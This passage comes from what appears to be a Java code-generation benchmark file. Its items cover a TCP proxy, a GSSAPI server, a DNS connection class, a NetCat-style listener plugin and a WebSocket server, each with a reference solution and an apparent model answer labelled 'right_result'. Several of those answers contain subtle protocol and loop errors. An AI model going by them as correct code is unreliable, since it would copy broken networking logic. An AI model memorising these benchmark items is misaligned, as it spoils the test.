and closes connections",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\n\npublic class JankyProxy {\n    private static ThreadProxy thread;\n\n    public static void runServer(String host, int remoteport, int localport) {\n        try {\n            System.out.println(\"Starting proxy for \" + host + \":\" + remoteport + \" on port \" + localport);\n            ServerSocket server = new ServerSocket(localport);\n            thread = new ThreadProxy(server, host, remoteport);\n        } catch (Exception e) {\n            System.err.println(e);\n            System.err.println(\"Usage: java ProxyMultiThread <host> <remoteport> <localport>\");\n        }\n    }\n\n    public static boolean wasUsed() {\n        return thread.wasUsedForClientToServer;\n    }\n\n    public static void shutdown() {\n        if (thread != null) {\n            try {\n                thread.shutdown();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class ThreadProxy extends Thread {\n        private Socket sClient;\n        private ServerSocket socket;\n        private final String SERVER_URL;\n        private final int SERVER_PORT;\n        public boolean wasUsedForClientToServer;\n\n        public ThreadProxy(ServerSocket socket, String ServerUrl, int ServerPort) {\n            this.SERVER_URL = ServerUrl;\n            this.SERVER_PORT = ServerPort;\n            this.socket = socket;\n            this.start();\n        }\n\n        @Override\n        public void run() {\n            try {\n                sClient = socket.accept();\n                final byte[] request = new byte[1024];\n                byte[] reply = new byte[4096];\n                final InputStream inFromClient = sClient.getInputStream();\n                final OutputStream outToClient = sClient.getOutputStream();\n                Socket server = null;\n\n                try {\n                    server = new Socket(SERVER_URL, SERVER_PORT);\n                } catch (IOException e) {\n                    PrintWriter out = new PrintWriter(new OutputStreamWriter(outToClient));\n                    out.flush();\n                    System.out.println(\"SERVER_URL = \" + SERVER_URL + \" : \" + SERVER_PORT);\n                    throw new RuntimeException(e);\n                }\n\n                final InputStream inFromServer = server.getInputStream();\n                final OutputStream outToServer = server.getOutputStream();\n\n                new Thread(() -> {\n                    int bytes_read;\n                    try {\n                        while ((bytes_read = inFromClient.read(request)) != -1) {\n                            outToServer.write(request, 0, bytes_read);\n                            outToServer.flush();\n                            wasUsedForClientToServer = true;\n                        }\n                    } catch (IOException ignored) {\n                    }\n                    try {\n                        outToServer.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }).start();\n\n                int bytes_read;\n                try {\n                    while ((bytes_read = inFromServer.read(reply)) != -1) {\n                        outToClient.write(reply, 0, bytes_read);\n                        outToClient.flush();\n                    }\n                } catch (IOException e) {\n                } finally {\n                    try {\n                        if (server != null) server.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                outToClient.close();\n                sClient.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void shutdown() {\n            try {\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            interrupt();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\nclass JankyProxy {\n    private ThreadProxy thread;\n    private Socket sClient;\n    private ServerSocket socket;\n    private String SERVER_URL;\n    private int SERVER_PORT;\n    private boolean wasUsedForClientToServer;\n\n    public void runServer(String host, int remoteport, int localport) {\n        try {\n            SERVER_URL = host;\n            SERVER_PORT = remoteport;\n            socket = new ServerSocket(localport);\n            sClient = socket.accept();\n            thread = new ThreadProxy(sClient);\n            thread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public boolean wasUsed() {\n        return wasUsedForClientToServer;\n    }\n\n    public void shutdown() {\n        if (thread != null) {\n            thread.shutdown();\n        }\n        try {\n            if (sClient != null && !sClient.isClosed()) {\n                sClient.close();\n            }\n            if (socket != null && !socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ThreadProxy extends Thread {\n        private Socket clientSocket;\n        private volatile boolean running = true;\n\n        public ThreadProxy(Socket socket) {\n            this.clientSocket = socket;\n        }\n\n        @Override\n        public void run() {\n            try (\n                Socket sServer = new Socket(SERVER_URL, SERVER_PORT);\n                InputStream inFromClient = clientSocket.getInputStream();\n                OutputStream outToServer = sServer.getOutputStream();\n                InputStream inFromServer = sServer.getInputStream();\n                OutputStream outToClient = clientSocket.getOutputStream()\n            ) {\n                byte[] buffer = new byte[8192];\n                int bytesRead;\n\n                while (running && (bytesRead = inFromClient.read(buffer)) != -1) {\n                    wasUsedForClientToServer = true;\n                    outToServer.write(buffer, 0, bytesRead);\n                    outToServer.flush();\n\n                    while (running && (bytesRead = inFromServer.read(buffer)) != -1) {\n                        outToClient.write(buffer, 0, bytesRead);\n                        outToClient.flush();\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void shutdown() {\n            running = false;\n            try {\n                if (clientSocket != null && !clientSocket.isClosed()) {\n                    clientSocket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 528,
    "Instruction": "Task Description: Implement a Java class that creates a TCP server using ServerSocket with GSSAPI (Generic Security Services API) authentication for secure client-server communication.\n\nClass Description: The GSSServer class establishes a secure TCP server that listens for incoming client connections, performs GSSAPI authentication, and enables secure message exchange between server and client.\n\nAttributes:\n- s: [ServerSocket] - The server socket that listens for incoming client connections on a specified port.\n\nMethods:\n- main([String[] args]) -> [void] - Entry point of the server application. Parses command line arguments (service name, port, and mechanism OID), creates server credentials, and starts listening for client connections.\n  Input: Command line arguments (optional: -port [portNumber], -mech [mechanismOID], serviceName)\n  Output: None (runs indefinitely until terminated)\n\n- processClient([GSSCredential server], [Socket client]) -> [void] - Handles an individual client connection by performing GSSAPI authentication and establishing a secure context.\n  Input: \n    - server: [GSSCredential] - Server's credentials for authentication\n    - client: [Socket] - Client connection socket\n  Output: None (closes connection when done)\n\n- exchangeWithPeer([GSSContext aCtxt], [DataInputStream dis], [DataOutputStream dos]) -> [void] - Performs secure message exchange with an authenticated client.\n  Input:\n    - aCtxt: [GSSContext] - Established security context\n    - dis: [DataInputStream] - Input stream from client\n    - dos: [DataOutputStream] - Output stream to client\n  Output: None (sends response and closes connection)\n\n- usage() -> [void] - Prints usage instructions for the server application.\n  Input: None\n  Output: None (prints to console)\n\n- print([String msg]) -> [void] - Helper method to print messages to console.\n  Input: msg [String] - Message to print\n  Output: None (prints to console)\n\n- exit([int status]) -> [void] - Cleanly shuts down the server by closing the server socket and exiting the application.\n  Input: status [int] - Exit status code\n  Output: None (terminates application)",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\nimport com.sun.gssapi.*;\n\nclass GSSServer {\n\n    private static ServerSocket s;\n\n    public static void main(String args[]) {\n        int port = 4444;\n\n        if (args.length < 1) {\n            usage();\n            exit(-1);\n        }\n\n        try {\n            String serviceName = args[args.length-1];\n            Oid mechOid = GSSManager.getDefaultMech();\n\n            for (int i = 0; i < args.length; i++) {\n                if (args[i].equals(\"-port\")) {\n                    if (i >= (args.length - 2)) {\n                        usage();\n                        exit(-1);\n                    }\n                    port = Integer.parseInt(args[++i]);\n                } else if (args[i].equals(\"-mech\")) {\n                    if (i >= (args.length-2)) {\n                        usage();\n                        exit(-1);\n                    }\n                    mechOid = new Oid(args[++i]);\n                }\n            }\n\n            GSSCredential server = new GSSCredential(new GSSName(serviceName,\n                GSSName.NT_HOSTBASED_SERVICE), GSSCredential.INDEFINITE,\n                mechOid, GSSCredential.ACCEPT_ONLY);\n\n            s = new ServerSocket(port);\n\n            while (true) {\n                Socket c = s.accept();\n                processClient(server, c);\n            }\n        } catch (IOException e) {\n            print(\"\\n**Communication ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        } catch (GSSException e) {\n            print(\"\\n**GSSAPI ERROR**:\\t\" + e.getMessage());\n            e.printStackTrace();\n            exit(-1);\n        }\n    }\n\n    private static void processClient(GSSCredential server, Socket client)\n            throws GSSException, IOException {\n        DataInputStream dis = new DataInputStream(new BufferedInputStream(client.getInputStream()));\n        DataOutputStream dos = new DataOutputStream(client.getOutputStream());\n\n        int tokLen = dis.readInt();\n        byte []inTok = new byte[tokLen];\n        dis.readFully(inTok, 0, inTok.length);\n\n        GSSContext aCtxt = new GSSContext(server);\n\n        do {\n            byte []outTok = aCtxt.accept(inTok, 0, inTok.length);\n\n            if (outTok != null) {\n                dos.writeInt(outTok.length);\n                dos.write(outTok);\n            }\n\n            if (aCtxt.isEstablished())\n                break;\n\n            inTok = new byte[dis.readInt()];\n            dis.readFully(inTok, 0, inTok.length);\n        } while (true);\n\n        exchangeWithPeer(aCtxt, dis, dos);\n        aCtxt.dispose();\n        client.close();\n    }\n\n    private static void exchangeWithPeer(GSSContext aCtxt, DataInputStream dis,\n            DataOutputStream dos) throws GSSException, IOException {\n        int len = dis.readInt();\n        ByteArrayOutputStream bos = new ByteArrayOutputStream();\n        MessageProp mInfo = new MessageProp();\n\n        aCtxt.unwrap(dis, bos, mInfo);\n\n        mInfo.setQOP(0);\n        mInfo.setPrivacy(false);\n\n        byte []peerTok = bos.toByteArray();\n        byte []toPeer = aCtxt.getMIC(peerTok, 0, peerTok.length, mInfo);\n\n        dos.writeInt(toPeer.length);\n        dos.write(toPeer);\n        dos.close();\n    }\n\n    private static void usage() {\n        print(\"\\nUsage:\\tGSSServert [-mech 1.2.34] [-port port] serviceName\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        if (s != null) {\n            try {\n                s.close();\n            } catch (IOException e) {};\n        }\n        System.exit(status);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport javax.security.auth.login.LoginContext;\nimport javax.security.auth.login.LoginException;\nimport org.ietf.jgss.*;\nimport java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class GSSServer {\n    private ServerSocket s;\n\n    public static void main(String[] args) throws Exception {\n        int port = 8888;\n        String serviceName = \"host\";\n        String mechOidStr = null;\n        for (int i = 0; i < args.length; i++) {\n            if (args[i].equals(\"-port\") && i + 1 < args.length) {\n                port = Integer.parseInt(args[++i]);\n            } else if (args[i].equals(\"-mech\") && i + 1 < args.length) {\n                mechOidStr = args[++i];\n            } else if (!args[i].startsWith(\"-\")) {\n                serviceName = args[i];\n            }\n        }\n\n        Oid mechOid = mechOidStr != null ? new Oid(mechOidStr) : null;\n\n        LoginContext lc = new LoginContext(\"GSSServer\");\n        lc.login();\n\n        GSSManager manager = GSSManager.getInstance();\n        GSSName serverName = manager.createName(serviceName, GSSName.NT_HOSTBASED_SERVICE);\n        GSSCredential serverCred = manager.createCredential(serverName, GSSCredential.INDEFINITE_LIFETIME,\n                mechOid, GSSCredential.ACCEPT_ONLY);\n\n        GSSServer server = new GSSServer();\n        server.s = new ServerSocket(port);\n        print(\"Server started on port \" + port);\n\n        while (true) {\n            Socket client = server.s.accept();\n            print(\"Client connected: \" + client.getInetAddress());\n            new Thread(() -> {\n                try {\n                    processClient(serverCred, client);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }).start();\n        }\n    }\n\n    private static void processClient(GSSCredential serverCred, Socket client) throws IOException, GSSException {\n        DataInputStream dis = new DataInputStream(client.getInputStream());\n        DataOutputStream dos = new DataOutputStream(client.getOutputStream());\n\n        GSSManager manager = GSSManager.getInstance();\n        GSSContext context = manager.createContext(serverCred);\n        byte[] token = new byte[0];\n\n        boolean established = false;\n        while (!established) {\n            token = context.initSecContext(token, 0, token.length);\n            if (token != null) {\n                dos.writeInt(token.length);\n                dos.write(token);\n            }\n            if (dis.available() > 0) {\n                int len = dis.readInt();\n                token = new byte[len];\n                dis.readFully(token);\n                token = context.acceptSecContext(token, 0, token.length);\n                established = context.isEstablished();\n            }\n        }\n\n        print(\"Security context established with client.\");\n        exchangeWithPeer(context, dis, dos);\n        context.dispose();\n        client.close();\n    }\n\n    private static void exchangeWithPeer(GSSContext aCtxt, DataInputStream dis, DataOutputStream dos)\n            throws IOException, GSSException {\n        byte[] msg = \"Hello from server!\".getBytes();\n        byte[] outToken = aCtxt.wrap(msg, 0, msg.length, GSSContext.GSS_C_QOP_DEFAULT);\n        dos.writeInt(outToken.length);\n        dos.write(outToken);\n        print(\"Sent message to client.\");\n\n        int len = dis.readInt();\n        byte[] inToken = new byte[len];\n        dis.readFully(inToken);\n        byte[] unwrapped = aCtxt.unwrap(inToken, 0, inToken.length);\n        print(\"Received from client: \" + new String(unwrapped));\n    }\n\n    private static void usage() {\n        System.out.println(\"Usage: java GSSServer [-port <portNumber>] [-mech <mechanismOID>] <serviceName>\");\n    }\n\n    private static void print(String msg) {\n        System.out.println(msg);\n    }\n\n    private static void exit(int status) {\n        try {\n            if (new GSSServer().s != null) {\n                new GSSServer().s.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        System.exit(status);\n    }\n}\n```"
  },
  {
    "Task_id": 529,
    "Instruction": "Task Description: Implement a Java class for handling DNS connections using TCP sockets, including server listening, client connection, message sending/receiving, and resource cleanup.\n\nClass Description: The DNSConnection class provides functionality for establishing and managing TCP-based DNS connections. It supports both server-side (incoming) and client-side (outgoing) connections, message transmission with length prefixing, and proper resource management.\n\nAttributes:\n- PORT: [int] - Constant defining the DNS port (53)\n- MAX_MSG_LEN: [int] - Maximum allowed message length (65535)\n- listener: [ServerSocket] - Server socket for incoming connections\n- socket: [Socket] - Current active socket connection\n- msgBytes: [byte[]] - Buffer for received message data\n- msgLen: [int] - Length of the current message\n- in: [BufferedInputStream] - Input stream for reading data\n- out: [OutputStream] - Output stream for writing data\n- lenBuf: [byte[]] - Buffer for message length prefix (2 bytes)\n\nMethods:\n- listen(): [void] -> [void] - Starts listening for incoming connections on the DNS port\n- stopListening(): [void] -> [void] - Stops the server socket from listening\n- openIncoming(): [void] -> [void] - Accepts an incoming client connection\n- open(InetAddress server): [void] -> [void] - Opens a connection to a DNS server\n- send(byte[] msgBytes): [void] -> [void] - Sends a message with length prefix\n- receive(boolean wait): [byte[]] -> [byte[]] - Receives a message (optionally waiting)\n- close(): [void] -> [void] - Closes the current connection and cleans up resources",
    "Canonical_solution": "import java.io.BufferedInputStream;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\n\npublic final class DNSConnection {\n\n    public static final int PORT = 53;\n    public static final int MAX_MSG_LEN = 0xFFFF;\n    protected static ServerSocket listener;\n    protected Socket socket;\n    protected byte[] msgBytes;\n    protected int msgLen;\n    protected BufferedInputStream in;\n    protected OutputStream out;\n    protected final byte[] lenBuf = new byte[2];\n\n    public DNSConnection() {}\n\n    public static void listen() throws IOException {\n        ServerSocket curListener;\n        if ((curListener = listener) == null) {\n            try {\n                listener = new ServerSocket(PORT);\n            } catch (SecurityException e) {\n                throw new SocketException(\"SecurityException: listen()\");\n            }\n        }\n        curListener = null;\n    }\n\n    public static void stopListening() {\n        ServerSocket curListener;\n        if ((curListener = listener) != null) {\n            listener = null;\n            try {\n                curListener.close();\n            } catch (IOException e) {}\n            curListener = null;\n        }\n    }\n\n    public void openIncoming() throws IOException {\n        ServerSocket curListener;\n        if ((curListener = listener) != null) {\n            try {\n                Socket socket = curListener.accept();\n                BufferedInputStream in = new BufferedInputStream(socket.getInputStream(), DNSMsgHeader.UDP_PACKET_LEN);\n                this.out = socket.getOutputStream();\n                this.in = in;\n                this.msgBytes = null;\n                this.socket = socket;\n                return;\n            } catch (SecurityException e) {}\n        }\n        throw new SocketException(curListener == null ? \"Not listening\" : \"SecurityException: accept()\");\n    }\n\n    public void open(InetAddress server) throws NullPointerException, IOException {\n        server.hashCode();\n        try {\n            Socket socket = new Socket(server, PORT);\n            BufferedInputStream in = new BufferedInputStream(socket.getInputStream(), DNSMsgHeader.UDP_PACKET_LEN);\n            this.out = socket.getOutputStream();\n            this.in = in;\n            this.socket = socket;\n        } catch (SecurityException e) {\n            throw new SocketException(\"SecurityException: connect(\" + server.getHostAddress() + \")\");\n        }\n        this.msgBytes = null;\n    }\n\n    public void send(byte[] msgBytes) throws NullPointerException, IOException {\n        int msgLen;\n        if ((msgLen = msgBytes.length) >= MAX_MSG_LEN)\n            msgLen = MAX_MSG_LEN;\n        OutputStream out;\n        if ((out = this.out) == null)\n            throw new SocketException(\"Connection closed\");\n        byte[] lenBuf = this.lenBuf;\n        lenBuf[0] = (byte)(msgLen >> 8);\n        lenBuf[1] = (byte)msgLen;\n        out.write(lenBuf, 0, 2);\n        out.write(msgBytes, 0, msgLen);\n        out.flush();\n    }\n\n    public byte[] receive(boolean wait) throws IOException {\n        byte[] msgBytes;\n        int msgLen, len;\n        BufferedInputStream in;\n        if ((in = this.in) == null)\n            throw new SocketException(\"Connection closed\");\n        if ((msgLen = this.msgLen) <= 0)\n            msgLen = 0;\n        if ((msgBytes = this.msgBytes) == null) {\n            do {\n                if (!wait && in.available() <= 0)\n                    return null;\n                else if ((len = in.read()) < 0)\n                    throw new EOFException();\n                else if (msgLen <= 0)\n                    this.msgLen = msgLen = len + 1;\n                else break;\n            } while (true);\n            if ((msgLen = ((msgLen - 1) << 8) | len) <= 0)\n                msgLen = 0;\n            this.msgBytes = msgBytes = new byte[msgLen];\n            msgLen = 0;\n        }\n        for (int avail; (len = msgBytes.length - (this.msgLen = msgLen)) > 0; msgLen += len)\n            if (!wait && (avail = in.available()) < len && (len = avail) <= 0)\n                return null;\n            else if ((len = in.read(msgBytes, msgLen, len)) < 0)\n                throw new EOFException();\n        this.msgBytes = null;\n        this.msgLen = 0;\n        return msgBytes;\n    }\n\n    public void close() {\n        Socket socket;\n        if ((socket = this.socket) != null) {\n            this.socket = null;\n            this.in = null;\n            this.out = null;\n            this.msgBytes = null;\n            try {\n                socket.close();\n            } catch (IOException e) {}\n            socket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class DNSConnection {\n    public static final int PORT = 53;\n    public static final int MAX_MSG_LEN = 65535;\n\n    private ServerSocket listener;\n    private Socket socket;\n    private byte[] msgBytes;\n    private int msgLen;\n    private BufferedInputStream in;\n    private OutputStream out;\n    private byte[] lenBuf = new byte[2];\n\n    public void listen() throws IOException {\n        listener = new ServerSocket(PORT);\n    }\n\n    public void stopListening() throws IOException {\n        if (listener != null && !listener.isClosed()) {\n            listener.close();\n        }\n    }\n\n    public void openIncoming() throws IOException {\n        if (listener == null || listener.isClosed()) {\n            throw new IOException(\"Server is not listening.\");\n        }\n        socket = listener.accept();\n        in = new BufferedInputStream(socket.getInputStream());\n        out = socket.getOutputStream();\n    }\n\n    public void open(InetAddress server) throws IOException {\n        socket = new Socket(server, PORT);\n        in = new BufferedInputStream(socket.getInputStream());\n        out = socket.getOutputStream();\n    }\n\n    public void send(byte[] msgBytes) throws IOException {\n        if (msgBytes.length > MAX_MSG_LEN) {\n            throw new IllegalArgumentException(\"Message exceeds maximum allowed length.\");\n        }\n        byte[] lenBytes = new byte[]{\n                (byte) ((msgBytes.length >> 8) & 0xFF),\n                (byte) (msgBytes.length & 0xFF)\n        };\n        out.write(lenBytes);\n        out.write(msgBytes);\n        out.flush();\n    }\n\n    public byte[] receive(boolean wait) throws IOException {\n        int bytesRead = 0;\n        while (bytesRead < 2) {\n            int result = in.read(lenBuf, bytesRead, 2 - bytesRead);\n            if (result == -1) {\n                if (wait) {\n                    continue;\n                } else {\n                    return null;\n                }\n            }\n            bytesRead += result;\n        }\n        int msgLength = ((lenBuf[0] & 0xFF) << 8) | (lenBuf[1] & 0xFF);\n        if (msgLength > MAX_MSG_LEN) {\n            throw new IOException(\"Received message exceeds maximum allowed length.\");\n        }\n        msgBytes = new byte[msgLength];\n        bytesRead = 0;\n        while (bytesRead < msgLength) {\n            int result = in.read(msgBytes, bytesRead, msgLength - bytesRead);\n            if (result == -1) {\n                if (wait) {\n                    continue;\n                } else {\n                    return null;\n                }\n            }\n            bytesRead += result;\n        }\n        return msgBytes;\n    }\n\n    public void close() throws IOException {\n        if (in != null) {\n            in.close();\n        }\n        if (out != null) {\n            out.close();\n        }\n        if (socket != null && !socket.isClosed()) {\n            socket.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 531,
    "Instruction": "Task Description: Create a Java class that implements a simplified NetCat-like TCP server using ServerSocket for client-server communication, with WebSocket support for real-time interaction.\n\nClass Description: The NetCat class is a WebSocket plugin that creates a TCP server listening on a specified port, accepts client connections, and enables bidirectional communication between server and client through input/output streams.\n\nAttributes:\nport: [int] - The port number on which the server listens for client connections\nserver: [ServerSocket] - The ServerSocket instance used to accept client connections\nclient: [Socket] - The Socket instance representing the connected client\npool: [ExecutorService] - Thread pool for handling client communication\nos: [OutputStream] - Output stream for sending data to the client\npw: [PrintWriter] - Buffered writer for sending data to the client\n\nMethods:\ncheck: [Map param] -> [boolean] - Validates if the specified port is valid (>= 10000)\nbefore: [void] -> [void] - Initializes the ServerSocket and starts listening for connections\nlisten: [void] -> [void] - Accepts incoming client connections and sets up I/O streams\necho: [void] -> [void] - Continuously reads and displays data received from the client\nstart: [void] -> [Object] - Main execution loop that sends user input to the client\nonClose: [void] -> [void] - Cleans up resources by closing sockets and shutting down threads",
    "Canonical_solution": "import com.trackray.base.annotation.Plugin;\nimport com.trackray.base.annotation.Param;\nimport com.trackray.base.annotation.Rule;\nimport com.trackray.base.plugin.WebSocketPlugin;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.io.*;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Map;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\n@Plugin(value = \"netcat\", title = \"NetCat \u7b80\u6613\u7248\" , author = \"\u6d45\u84dd\")\n@Rule(params = {@Param(key = \"port\",defaultValue = \"10010\" , desc = \"\u76d1\u542c\u7684\u7aef\u53e3\uff0c\u5c3d\u91cf\u907f\u514d\u5c0f\u4e8e10000\u7684\u7aef\u53e3\"),},\n        sync = true,  websocket = true )\npublic class NetCat extends WebSocketPlugin {\n    private int port;\n    private ServerSocket server;\n    private Socket client;\n    private ExecutorService pool;\n    private OutputStream os;\n    private PrintWriter pw;\n\n    @Override\n    public boolean check(Map param) {\n        port = Integer.parseInt(param.get(\"port\").toString());\n        return port >= 10000;\n    }\n\n    @Override\n    public void before() {\n        try {\n            server = new ServerSocket(port);\n            pool = Executors.newSingleThreadExecutor();\n            println(\"port:\"+port);\n            println(\"\u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5\");\n            listen();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void listen() {\n        try {\n            client = server.accept();\n            if (client.isConnected()){\n                println(\"\u5ba2\u6237\u7aef\u5df2\u8fde\u63a5:\"+client.getInetAddress().getHostAddress());\n                os = client.getOutputStream();\n                pw = new PrintWriter(os, true);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        pool.execute(() -> {\n            while (true){\n                echo();\n            }\n        });\n    }\n\n    private void echo() {\n        try {\n            if (client.isConnected()){\n                InputStream is = client.getInputStream();\n                BufferedReader bri = new BufferedReader(new InputStreamReader(is));\n                String temp;\n                while ((temp = bri.readLine())!=null && !\"\".equals(temp)) {\n                    println(temp);\n                }\n            }\n        }catch (Exception e){\n            println(e.getMessage());\n        }\n    }\n\n    @Override\n    public Object start() {\n        while (client!=null && client.isConnected()){\n            String input = getInput();\n            if (StringUtils.isNotBlank(input)){\n                pw.println(input);\n            }\n        }\n        println(\"\u4e3b\u673a\u5df2\u4e0b\u7ebf\");\n        return null;\n    }\n\n    @Override\n    public void onClose() {\n        try {\n            pool.shutdownNow();\n            if (client!=null && !client.isClosed())\n            {\n                client.close();\n            }\n            server.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.Map;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class NetCat {\n    private int port;\n    private ServerSocket server;\n    private Socket client;\n    private ExecutorService pool;\n    private OutputStream os;\n    private PrintWriter pw;\n\n    public boolean check(Map<String, Object> param) {\n        if (param.containsKey(\"port\")) {\n            this.port = (int) param.get(\"port\");\n            return port >= 10000;\n        }\n        return false;\n    }\n\n    public void before() {\n        try {\n            server = new ServerSocket(port);\n            pool = Executors.newFixedThreadPool(2);\n            listen();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void listen() {\n        new Thread(() -> {\n            try {\n                client = server.accept();\n                os = client.getOutputStream();\n                pw = new PrintWriter(os, true);\n                echo();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public void echo() {\n        pool.submit(() -> {\n            try (BufferedReader br = new BufferedReader(new InputStreamReader(client.getInputStream()))) {\n                String line;\n                while ((line = br.readLine()) != null) {\n                    System.out.println(line);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public Object start() {\n        pool.submit(() -> {\n            try (BufferedReader stdin = new BufferedReader(new InputStreamReader(System.in))) {\n                String line;\n                while ((line = stdin.readLine()) != null) {\n                    pw.println(line);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        return null;\n    }\n\n    public void onClose() {\n        try {\n            if (client != null) client.close();\n            if (server != null) server.close();\n            if (os != null) os.close();\n            if (pw != null) pw.close();\n            if (pool != null) pool.shutdownNow();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 532,
    "Instruction": "Task Description: Create a WebSocket server class in Java that handles WebSocket connections, performs WebSocket handshake, and sends binary frames to clients.\n\nClass Description: The WebSocketServer class implements a basic WebSocket server that listens for incoming connections, performs the WebSocket handshake protocol, and sends binary data frames to connected clients. It supports configurable masking and frame size.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket used to listen for incoming connections\n- port: int - The port number on which the server listens for connections\n\nMethods:\n- WebSocketServer(int port) -> None - Constructor that initializes the server with the specified port number\n- start() -> void - Starts the server by creating and binding the server socket\n- handleConnection() -> void - Handles an incoming connection, performs WebSocket handshake, and sends binary frames\n- stop() -> void - Stops the server by closing the server socket\n\nThe class should:\n1. Accept incoming TCP connections\n2. Parse WebSocket handshake headers\n3. Generate proper handshake response\n4. Create and send binary frames with configurable masking and size\n5. Properly close connections and clean up resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Scanner;\nimport org.java_websocket.util.Charsetfunctions;\nimport org.java_websocket.util.KeyUtils;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.framing.BinaryFrame;\nimport java.nio.ByteBuffer;\n\npublic class WebSocketServer {\n\n    private ServerSocket serverSocket;\n    private int port;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        serverSocket = new ServerSocket(port);\n        serverSocket.setReuseAddress(true);\n    }\n\n    public void handleConnection() throws IOException, InterruptedException {\n        Socket client = serverSocket.accept();\n        Scanner in = new Scanner(client.getInputStream());\n        String input;\n        String seckey = \"\";\n        String testCase;\n        boolean useMask = false;\n        int size = 0;\n        OutputStream os = client.getOutputStream();\n\n        while (in.hasNext()) {\n            input = in.nextLine();\n            if (input.startsWith(\"Sec-WebSocket-Key: \")) {\n                seckey = input.split(\" \")[1];\n            }\n            if (input.startsWith(\"Upgrade\")) {\n                os.write(Charsetfunctions.asciiBytes(\n                    \"HTTP/1.1 101 Websocket Connection Upgrade\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\n\"\n                        + KeyUtils.getSecKey(seckey) + \"\\r\\n\"));\n                os.flush();\n                Thread.sleep(10);\n                Draft_6455 draft_6455 = new Draft_6455();\n                BinaryFrame binaryFrame = new BinaryFrame();\n                binaryFrame.setPayload(ByteBuffer.allocate(size));\n                binaryFrame.setTransferemasked(useMask);\n                ByteBuffer byteBuffer = draft_6455.createBinaryFrame(binaryFrame);\n                byte[] bytes = byteBuffer.array();\n                int first = size / 2;\n                os.write(bytes, 0, first);\n                os.flush();\n                Thread.sleep(5);\n                os.write(bytes, first, bytes.length - first);\n                os.flush();\n                break;\n            }\n            if (input.startsWith(\"GET \")) {\n                testCase = input.split(\" \")[1];\n                String[] strings = testCase.split(\"/\");\n                useMask = Boolean.valueOf(strings[1]);\n                size = Integer.valueOf(strings[2]);\n            }\n        }\n        client.close();\n    }\n\n    public void stop() throws IOException {\n        serverSocket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.security.MessageDigest;\nimport java.util.Base64;\n\npublic class WebSocketServer {\n    private ServerSocket serverSocket;\n    private int port;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            System.out.println(\"WebSocket server started on port \" + port);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleConnection(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleConnection(Socket clientSocket) {\n        try (\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n            OutputStream outputStream = clientSocket.getOutputStream()\n        ) {\n            StringBuilder request = new StringBuilder();\n            String line;\n            while (!(line = in.readLine()).isEmpty()) {\n                request.append(line).append(\"\\r\\n\");\n            }\n\n            String key = getKeyFromRequest(request.toString());\n            if (key == null) {\n                return;\n            }\n\n            String response = 